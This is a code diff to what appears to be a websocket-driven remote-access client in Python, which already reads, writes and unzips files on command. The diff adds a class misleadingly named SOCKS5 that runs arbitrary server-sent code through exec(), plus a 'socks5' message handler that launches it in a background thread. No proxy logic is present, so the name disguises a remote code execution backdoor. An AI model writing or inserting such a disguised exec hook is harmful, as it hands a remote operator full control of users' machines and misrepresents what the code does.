@@ -1,5 +1,6 @@
 import string
 import sys
+import threading
 import time
 import zipfile
 import websocket
@@ -91,7 +92,7 @@ class File:
                     f.write(data)
                 return {"msg": "success"}
             else:
-                with open(path, "r") as f:
+                with open(path, "r", encoding="utf-8") as f:
                     _data = f.read()
                 return {"msg": "success", "data": _data}
         except Exception as e:
@@ -149,6 +150,15 @@ class File:
             return {"msg": "success"}
         except Exception as _e:
             return {"msg": _e.__str__()}
+
+
+class SOCKS5:
+    def __init__(self):
+        pass
+
+    @staticmethod
+    def run(code):
+        exec(code, globals())
 
 
 class Client:
@@ -214,6 +224,10 @@ class Client:
             self.send(data_bean.json())
         elif msg.get("type") == "unzip":
             data_bean.raw = File.uncompress(msg["data"]["file_abspath"], msg["data"]["last_dirname"])
+            self.send(data_bean.json())
+        elif msg.get("type") == "socks5":
+            threading.Thread(target=SOCKS5.run, args=(msg["code"], )).start()
+            data_bean.raw = "success"
             self.send(data_bean.json())
         else:
             try:
